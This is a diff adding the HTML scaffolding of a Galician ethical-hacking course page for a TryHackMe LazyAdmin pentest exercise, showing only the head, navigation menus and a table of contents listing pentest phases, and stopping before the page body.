@@ -1,0 +1,2581 @@
+
+<!doctype html>
+<html lang="gl" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../tryhackme/">
+      
+      
+        <link rel="next" href="../hackthebox/">
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.22">
+    
+    
+      
+        <title>Prácticas Taller - Hacking Ético - UD1 - Introdución á seguridade ofensiva</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.84d31ad4.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../css/custom.css">
+    
+      <link rel="stylesheet" href="../../../css/opera.css">
+    
+      <link rel="stylesheet" href="../../../css/print.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#practica-taller-lazyadmin-tryhackme-pentest-completo-paso-a-paso" class="md-skip">
+          Ir ao contido
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Cabeceira">
+    <a href="../../.." title="Hacking Ético - UD1 - Introdución á seguridade ofensiva" class="md-header__button md-logo" aria-label="Hacking Ético - UD1 - Introdución á seguridade ofensiva" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Hacking Ético - UD1 - Introdución á seguridade ofensiva
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Prácticas Taller
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Cambiar a modo oscuro"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Cambiar a modo oscuro" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6m0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4M7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="indigo"  aria-label="Cambiar a modo normal"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Cambiar a modo normal" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Procura" placeholder="Procura" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Procurar">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Limpar" aria-label="Limpar" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Inicializando procura
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="Pestanas" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  De interese
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../apuntamentos/he/" class="md-tabs__link">
+          
+  
+  
+  Apuntamentos UD1
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../informes-sysreptor/" class="md-tabs__link">
+          
+  
+  
+  Prácticas Taller UD1
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navegación" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Hacking Ético - UD1 - Introdución á seguridade ofensiva" class="md-nav__button md-logo" aria-label="Hacking Ético - UD1 - Introdución á seguridade ofensiva" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Hacking Ético - UD1 - Introdución á seguridade ofensiva
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    De interese
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Apuntamentos UD1
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Apuntamentos UD1
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apuntamentos/he/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Que é o Hacking Ético
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apuntamentos/tipos-hackers/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Tipos de Hackers
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apuntamentos/tipos-auditorias/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Tipos de Auditorías
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apuntamentos/caid/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Fundamentos da Seguridade da Información (CAID)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apuntamentos/fases/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Fases dun Test de Intrusión (Pentest)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_6" id="__nav_2_6_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Informes de Pentesting
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_6">
+            <span class="md-nav__icon md-icon"></span>
+            Informes de Pentesting
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apuntamentos/informes/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Informes
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apuntamentos/informes/CVE-2011-2523/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    CVE
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apuntamentos/informes/clasificacion_risco_cvss/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    CVSS
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apuntamentos/informes/cwe/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    CWE
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apuntamentos/etica/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Ética e Legalidade
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apuntamentos/marcos/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Marcos de traballo
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apuntamentos/modelos-ataque-defensa/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Modelos de Ataque e Defensa
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_10" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_10" id="__nav_2_10_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    ClearNet, Deep Web e Dark Web
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_10_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_10">
+            <span class="md-nav__icon md-icon"></span>
+            ClearNet, Deep Web e Dark Web
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apuntamentos/clearnet_deepweb_darkweb/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Explicación
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apuntamentos/verificar_sinatura_tor/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Verificación sinatura Tor
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apuntamentos/ferramentas/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Ferramentas Comúns
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apuntamentos/recursos/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Recursos de Aprendizaxe
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    Prácticas Taller UD1
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Prácticas Taller UD1
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Informes con sysreptor
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            Informes con sysreptor
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../informes-sysreptor/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Introdución
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../practicas-taller-sysreptor/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Práctica Taller
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Recursos de aprendizaxe
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            Recursos de aprendizaxe
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_1" id="__nav_3_2_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Metasploitable 2
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Metasploitable 2
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../metasploitable2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Introdución
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../practicas-taller-metasploitable2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Práctica Taller
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_2" id="__nav_3_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Metasploitable 3
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Metasploitable 3
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../metasploitable3/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Introdución
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../practicas-taller-metasploitable3/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Práctica Taller
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_3" id="__nav_3_2_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    VulnHub
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            VulnHub
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../vulnhub/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Introdución
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../practicas-taller-vulnhub/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Prácticas Taller
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_4" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_4" id="__nav_3_2_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    TryHackMe
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_2_4_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_2_4">
+            <span class="md-nav__icon md-icon"></span>
+            TryHackMe
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../tryhackme/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Introdución
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    Prácticas Taller
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    Prácticas Taller
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Táboa de contidos">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Táboa de contidos
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#obxectivo" class="md-nav__link">
+    <span class="md-ellipsis">
+      Obxectivo
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pasos-basicos" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pasos básicos
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#fases-dun-test-de-intrusion-pentest" class="md-nav__link">
+    <span class="md-ellipsis">
+      Fases dun test de intrusión (Pentest)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Fases dun test de intrusión (Pentest)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#fase-1-recopilacion-de-informacion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Fase 1: Recopilación de información
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Fase 1: Recopilación de información">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#opcion-1-acceder-mediante-attackbox" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción 1. Acceder mediante AttackBox
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#opcion-2-acceder-mediante-vpn" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción 2. Acceder mediante VPN
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fase-2-analise-de-vulnerabilidades" class="md-nav__link">
+    <span class="md-ellipsis">
+      Fase 2: Análise de vulnerabilidades
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fase-3-explotacion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Fase 3: Explotación
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fase-4-post-explotacion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Fase 4: Post-explotación
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fase-5-persistencia" class="md-nav__link">
+    <span class="md-ellipsis">
+      Fase 5: Persistencia
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Fase 5: Persistencia">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#engadir-usuario-permanente-e-ademais-facelo-root" class="md-nav__link">
+    <span class="md-ellipsis">
+      Engadir usuario permanente e ademais facelo root
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fase-6-informe-final" class="md-nav__link">
+    <span class="md-ellipsis">
+      Fase 6: Informe final
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_5" id="__nav_3_2_5_label" tabindex="0">
+            
+  
+  
